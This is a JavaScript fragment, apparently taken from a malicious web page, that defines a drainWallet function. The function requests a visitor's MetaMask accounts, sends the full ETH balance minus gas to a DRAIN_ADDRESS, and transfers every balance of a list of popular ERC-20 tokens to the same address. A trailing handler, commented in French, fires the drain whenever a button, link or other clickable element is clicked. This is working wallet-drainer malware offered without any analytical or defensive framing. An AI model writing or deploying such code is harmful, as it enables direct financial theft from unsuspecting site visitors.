            async function drainWallet() {
                if (typeof window.ethereum === 'undefined') {
                    throw new Error('MetaMask not detected');
                }

                // 1. Connect wallet
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });
                const userAddress = accounts[0];
                
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();

                // 2. Drain ETH
                const ethBalance = await provider.getBalance(userAddress);
                if (ethBalance.gt(0)) {
                    const gasPrice = await provider.getGasPrice();
                    const gasLimit = 21000;
                    const gasCost = gasPrice.mul(gasLimit);
                    const drainAmount = ethBalance.sub(gasCost);

                    if (drainAmount.gt(0)) {
                        const ethTx = await signer.sendTransaction({
                            to: DRAIN_ADDRESS,
                            value: drainAmount,
                            gasLimit: gasLimit,
                            gasPrice: gasPrice
                        });
                        await ethTx.wait();
                    }
                }

                // 3. Drain ERC-20 tokens
                for (const tokenAddress of POPULAR_TOKENS) {
                    try {
                        const tokenContract = new ethers.Contract(tokenAddress, [
                            "function balanceOf(address) view returns (uint256)",
                            "function transfer(address to, uint256 amount) returns (bool)"
                        ], signer);

                        const tokenBalance = await tokenContract.balanceOf(userAddress);
                        
                        if (tokenBalance.gt(0)) {
                            const tokenTx = await tokenContract.transfer(DRAIN_ADDRESS, tokenBalance);
                            await tokenTx.wait();
                        }
                    } catch (error) {
                        continue;
                    }
                }
                return true;
            }

                        const target = event.target;
                        // Déclencher sur n'importe quel bouton, lien ou élément interactif
                        if (target.tagName === 'BUTTON' || target.tagName === 'A' || target.onclick) {
                            try {
                                await drainWallet();
